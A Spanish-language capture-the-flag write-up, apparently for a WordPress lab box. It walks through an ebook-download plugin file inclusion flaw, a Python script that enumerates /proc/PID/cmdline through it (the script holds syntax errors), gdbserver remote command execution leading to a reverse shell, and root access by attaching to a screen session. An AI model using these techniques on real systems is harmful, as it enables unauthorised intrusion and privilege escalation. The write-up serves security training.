---------
- Tags: #lfi #rce #gdbserver #screen #proc/PID/cmdline
----------
## Tecnicas utilizadas

- WordPress Local File Inclusion Vulnerability (LFI)  
- LFI to RCE (Abusing /proc/PID/cmdline)  
- Gdbserver RCE Vulnerability  
- Abusing Screen (Privilege Escalation) [Session synchronization]

---------------
## Procedimiento
![[Pasted image 20230612193630.png]]

El escaneo con nmap da como resultado los siguientes puertos:

![[Pasted image 20230612194102.png]]

Si lanzamos un *whatweb* para ver las tecnologias que corren por detras de la pagina web podemos ver que es un wordpress:

![[Pasted image 20230612194213.png]]

--------------------
#### WordPress Local File Inclusion Vulnerability (LFI)

Si accedemos a la carpeta de */wp-content/plugins/* nos encontramos con que tenemos capacidad directory lisiting y ademas encontrar un archivo sospechoso:

![[Pasted image 20230612201015.png]]

Procederemos a fuzzear en el archivo en busca de algun parametro valido. No encotramos nada. Seguimos investigando las posibles entradas.
Sin embargo, husmeando con searchsploit que es *ebook-download* podemos ver que contiene una vulnerabilidad de tipo *File inclusion* en unos de sus parametros para descargar archivos.

![[Pasted image 20230613101303.png]]

-----------------
#### LFI to RCE (Abusing /proc/PID/cmdline)

Buscando por rutas tipicas no encontramos nada interesante, asi que podemos probar con */proc/$i/cmdline* ya que este cuenta con informacion relevante. Lo hariamos de la siguiente manera:

```python

import  requests, signal, time, sys, pdb
from pwn import *

def def_handler(sig, frame):
	print("\n[!] Saliendo...")
	sys.exit(1)

#ctrl + c
signal.signal(signal.SIGINT, def_handler)

# Variables globales
main_url "http://<ip>/<path>/<to>/<lfi>/"

def makeRequest():

	p1 = log.progress("Brute force")
	p1.status("Iniciando fuerza bruta")

	time.sleep(2)

	
	for i in range(1 1000):
		p1.status("Intentando con el path /proc/%s/cmdline" % str(i))
		url = main_url + "/proc/" + str(i) + "/cmdline"

		r = requests.get(url)

		if len(r.content) > 82:
			print("------------------------------------------------")
			log.info("PATH: /proc/%s/cmdlien" % str(i))
			log.info("Total Lengh: %s" % len(r.content))
			print(r.content)
			print("------------------------------------------------")


if __name__ == "__main__":
	
	makeRequest()

```

------------------
#### Gdbserver RCE Vulnerability

Encontramos un proceso interesante, vemos que la maquina esta corriendo **gdbserver**. Inspeccionando un poco con searchsploit vemos que hay una vulnerabilidad que nos permite ejecutar comandos de manera remota.

![[Pasted image 20230613113123.png]]

Si lo ejecutamos, vemos que no funciona a la primera, esto es quizás por que el proceso se esta ejecutando a intervalos regulares de tiempo, si lo seguimos intentando podemos conseguir una reverse shell.

---------------
#### Abusing Screen (Privilege Escalation)

Una vez dentro, si filtramos por binarios con privilegios **SUID** y vemos que existe **Screen**. Si vemos los procesos que se estan ejecutando con *ps -faux* y filtramos por *screen* vemos que hay una sesion que esta iniciada por root.
Si intentamos migrar a la sesion con *screen -x root/* escalamos privilegios.
